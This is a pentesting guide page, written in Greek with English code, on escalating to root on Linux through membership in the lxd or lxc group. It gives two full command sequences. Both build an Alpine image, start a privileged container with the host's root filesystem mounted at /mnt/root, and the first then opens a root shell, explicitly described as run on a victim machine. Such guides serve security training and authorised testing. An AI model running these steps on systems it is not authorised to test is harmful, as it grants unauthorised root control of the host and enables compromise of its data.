# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

Αν ανήκετε στην ομάδα _**lxd**_ **ή** _**lxc**_, μπορείτε να γίνετε root

## Εκμετάλλευση χωρίς ίντερνετ

### Μέθοδος 1

Μπορείτε να εγκαταστήσετε σε μηχανή σας αυτόν τον κατασκευαστή διανομών: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(ακολουθήστε τις οδηγίες του github):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
Ανεβάστε τα αρχεία **lxd.tar.xz** και **rootfs.squashfs**, προσθέστε την εικόνα στο αποθετήριο και δημιουργήστε ένα κοντέινερ:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Αν βρείτε αυτό το σφάλμα _**Σφάλμα: Δεν βρέθηκε πισίνα αποθήκευσης. Παρακαλώ δημιουργήστε μια νέα πισίνα αποθήκευσης**_\
> Εκτελέστε **`lxd init`** και **επαναλάβετε** το προηγούμενο κομμάτι εντολών

Τέλος, μπορείτε να εκτελέσετε το κοντέινερ και να αποκτήσετε δικαιώματα root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Μέθοδος 2

Δημιουργήστε μια εικόνα Alpine και ξεκινήστε την χρησιμοποιώντας την επιλογή `security.privileged=true`, αναγκάζοντας το κοντέινερ να αλληλεπιδρά ως root με το σύστημα αρχείων του host.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
